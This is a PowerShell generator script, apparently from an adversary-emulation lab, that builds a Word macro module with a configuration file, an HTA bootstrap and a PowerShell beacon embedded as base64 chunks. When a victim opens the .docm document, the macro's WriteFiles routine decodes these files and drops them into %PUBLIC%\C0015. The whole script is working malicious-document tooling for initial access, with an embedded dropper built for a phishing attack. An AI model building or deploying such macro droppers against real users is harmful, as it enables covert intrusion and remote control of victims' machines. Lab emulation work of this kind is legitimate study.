<#
.SYNOPSIS
Generate the self-contained VBA module (stage/ws01/macro_embedded.vba) that embeds
config.ini + bootstrap.hta + c0015_beacon.ps1 as base64 blobs, so the Word macro
WRITES them to %PUBLIC%\C0015\ at open time (docs/rerun-v2-remote-operator-design.md
§3.1). Result: before the victim opens test.docm the WS01 disk holds NO lab tooling
- config/HTA/beacon are created by the macro (camp-realistic initial access), and
any DLL still arrives over HTTP T1105 at runtime.

Output module = canonical payloads/docm/macro_payload.vba + WriteFiles() + consts.
Use with: install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba

.PARAMETER Config    Per-run config.ini (payloads/packaging/make_config.ps1 output).
.PARAMETER Hta       payloads/hta/bootstrap.hta
.PARAMETER Beacon    payloads/beacon/c0015_beacon.ps1
.PARAMETER Template  Canonical macro (payloads/docm/macro_payload.vba).
.PARAMETER OutPath   Generated module (default stage/ws01/macro_embedded.vba).
.EXAMPLE
pwsh -File payloads/packaging/gen_macro_embedded.ps1 -Config stage/ws01/config.ini
#>
[CmdletBinding()]
param(
    [string]$Config = 'stage/ws01/config.ini',
    [string]$Hta = 'payloads/hta/bootstrap.hta',
    [string]$Beacon = 'payloads/beacon/c0015_beacon.ps1',
    [string]$Template = 'payloads/docm/macro_payload.vba',
    [string]$OutPath = 'stage/ws01/macro_embedded.vba'
)
$ErrorActionPreference = 'Stop'
$repo = (Get-Item (Join-Path $PSScriptRoot '..\..')).FullName

function Load-B64 {
    param([string]$Rel)
    # accept relative (repo-rooted) or absolute input; Join-Path doubles the root
    # when the child is already rooted, so resolve explicitly.
    $p = if ([System.IO.Path]::IsPathRooted($Rel)) { $Rel }
         else { Join-Path $repo $Rel }
    if (-not (Test-Path -LiteralPath $p)) { throw "missing input: $Rel" }
    return [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($p))
}

$cfgB64 = Load-B64 $Config
$htaB64 = Load-B64 $Hta
$bcnB64 = Load-B64 $Beacon
$tpl = Get-Content -LiteralPath (Join-Path $repo $Template) -Raw

# ---- chunk each blob into < 900-char const lines (VBA line limit 1023) ----
function New-Chunks {
    param([string]$B64, [string]$Prefix)
    $out = New-Object System.Collections.Generic.List[string]
    for ($i = 0; $i -lt $B64.Length; $i += 900) {
        $len = [Math]::Min(900, $B64.Length - $i)
        $out.Add("Private Const ${Prefix}_$($out.Count) = `"$($B64.Substring($i, $len))`"")
    }
    return , $out.ToArray()
}
function New-Joined {
    param([string]$Prefix, [int]$Count)
    $parts = @()
    for ($i = 0; $i -lt $Count; $i++) { $parts += "${Prefix}_$i" }
    return ("Private Const {0} = {1}" -f $Prefix, ($parts -join ' & '))
}
$cCfg = New-Chunks $cfgB64 'CFG_B64'
$cHta = New-Chunks $htaB64 'HTA_B64'
$cBcn = New-Chunks $bcnB64 'BCN_B64'
$all = New-Object System.Collections.Generic.List[string]
$all.Add("' -------- embedded blobs (generated) --------")
$all.AddRange($cCfg); $all.AddRange($cHta); $all.AddRange($cBcn)
$all.Add((New-Joined 'CFG_B64' $cCfg.Count))
$all.Add((New-Joined 'HTA_B64' $cHta.Count))
$all.Add((New-Joined 'BCN_B64' $cBcn.Count))
$all.Add('')
$all.Add("' -------- write stage files at open (S1 delivery, T1204.002) --------")
$all.Add(@'
Private Sub WriteFiles()
    On Error GoTo Fail
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim d As String
    d = Environ("PUBLIC") & "\C0015"
    If Not fso.FolderExists(d) Then fso.CreateFolder d
    Dim t0 As Object
    Set t0 = fso.CreateTextFile(d & "\macro_ran.txt", True, True)
    t0.WriteLine "macro entered"
    t0.Close
    Dim names(2) As String, blobs(2) As String
    names(0) = "config.ini":          blobs(0) = CFG_B64
    names(1) = "bootstrap.hta":       blobs(1) = HTA_B64
    names(2) = "c0015_beacon.ps1":    blobs(2) = BCN_B64
    Dim i As Integer
    For i = 0 To 2
        Dim doc As Object, el As Object, st As Object
        Set doc = CreateObject("Msxml2.DOMDocument")
        Set el = doc.createElement("b64")
        el.dataType = "bin.base64"
        el.text = blobs(i)
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write el.nodeTypedValue
        st.SaveToFile d & "\" & names(i), 2
        st.Close
    Next i
    Exit Sub
Fail:
    On Error Resume Next
    Dim f1 As Object, t1 As Object
    Set f1 = CreateObject("Scripting.FileSystemObject")
    Set t1 = f1.CreateTextFile(Environ("PUBLIC") & "\C0015\writefiles_err.txt", True, True)
    t1.WriteLine "WriteFiles err " & Err.Number & " " & Err.Description & " at " & i
    t1.Close
End Sub
'@)
# ---- inject WriteFiles call at the top of RunEntry ----
$tpl = $tpl -replace '(?m)^Private Sub RunEntry\(\)\s*$', "Private Sub RunEntry()`r`n    WriteFiles   ' v2: no pre-staged files - macro creates config/hta/beacon"
$tpl = $tpl.TrimEnd() + "`r`n`r`n" + ($all -join "`r`n") + "`r`n"

$out = if ([System.IO.Path]::IsPathRooted($OutPath)) { $OutPath } else { Join-Path $repo $OutPath }
New-Item -ItemType Directory -Force -Path (Split-Path $out -Parent) | Out-Null
Set-Content -LiteralPath $out -Value $tpl -Encoding UTF8
Write-Output "generated: $out"
Write-Output "  embedded: config.ini ($($cfgB64.Length/1024 -as [int]) KB b64), bootstrap.hta ($($htaB64.Length/1024 -as [int]) KB), c0015_beacon.ps1 ($($bcnB64.Length/1024 -as [int]) KB)"
$runEntryCount = ([regex]::Matches($tpl, '(?m)^\s*(Private|Public)?\s*Sub\s+RunEntry\b')).Count
if ($runEntryCount -ne 1) { throw "generated module must define RunEntry exactly once (found $runEntryCount)" }
Write-Output "  guard: RunEntry x1 OK; WS01 step: install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba"